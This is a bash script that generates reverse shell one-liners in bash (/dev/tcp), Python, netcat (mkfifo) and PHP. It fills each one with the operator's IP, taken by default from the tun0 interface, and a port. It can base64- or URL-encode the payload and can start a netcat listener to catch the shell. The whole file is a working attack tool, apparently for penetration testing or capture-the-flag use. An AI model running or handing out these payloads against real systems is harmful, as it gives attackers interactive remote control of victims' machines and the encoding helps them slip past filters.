#!/bin/bash

declare -A PAYLOADS

PAYLOADS=(
    ["bash"]="bash -i >& /dev/tcp/%s/%s 0>&1"
    ["python"]="python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
    ["netcat"]="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f"
    ["php"]="php -r '\$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
)

TYPE="bash"
INTERFACE="tun0"
PORT=$(shuf -i 10000-65000 -n 1)
RUN=false
ENCODE=""

usage() {
    cat << EOF
OPTIONS:
    -t, --type           Payload Type [python, netcat, bash, php].
    -i, --ip             Local IP.
    -p, --port           Local Port.
    -r, --run            Run Netcat Listener.
    -e, --encode         Encode The Payload [base64, url].
    -I, --interface      Get The IP From Specific Interface (Default: tun0).
    -h, --help           Prints The Help and Exit.
EOF
}

encode_payload() {
    case "$1" in
        "base64")
            echo "$2" | base64 -w 0
            ;;
        "url")
            if command -v python3 &> /dev/null; then
                python3 -c "import urllib.parse as enc; print(enc.quote_plus('$2'))"
            else
                echo "Python 3 is required for URL encoding."
                exit 1
            fi
            ;;
        *)
            echo "$2"
            ;;
    esac
}

while (( "$#" )); do
    case "$1" in
        -t|--type)
            TYPE="$2"
            shift 2 ;;
        -i|--ip)
            IP="$2"
            shift 2 ;;
        -p|--port)
            PORT="$2"
            shift 2 ;;
        -r|--run)
            RUN=true
            shift ;;
        -e|--encode)
            ENCODE="$2"
            shift 2 ;;
        -I|--interface)
            INTERFACE="$2"
            IP="$(ip addr show $INTERFACE 2>/dev/null | grep "inet\b" | awk '{print $2}' | cut -d/ -f1)"
            if [ -z "$IP" ]; then
                echo "Unable to determine IP from interface '$INTERFACE'. Please choose a different interface or set IP manually."
                exit 1
            fi
            shift 2 ;;
        -h|--help)
            usage
            exit 0 ;;
        *)
            echo "[-] Unknown Option: $1"
            usage
            exit 1 ;;
    esac
done

# If no IP is set using -i option, then fetch from default interface.
if [ -z "$IP" ]; then
    IP="$(ip addr show $INTERFACE 2>/dev/null | grep "inet\b" | awk '{print $2}' | cut -d/ -f1)"
fi

# Check if IP is still empty
if [ -z "$IP" ]; then
    echo "Unable to determine IP. Please specify an interface using -I option or set the IP manually using -i."
    exit 1
fi

generate_payload() {
    printf "${PAYLOADS[$TYPE]}" "$IP" "$PORT"
}

payload=$(generate_payload)
payload=$(encode_payload "$ENCODE" "$payload")

echo "$payload"

if $RUN; then
    echo "[+] Starting Netcat Listener on port $PORT"
    nc -nvlp "$PORT"
fi
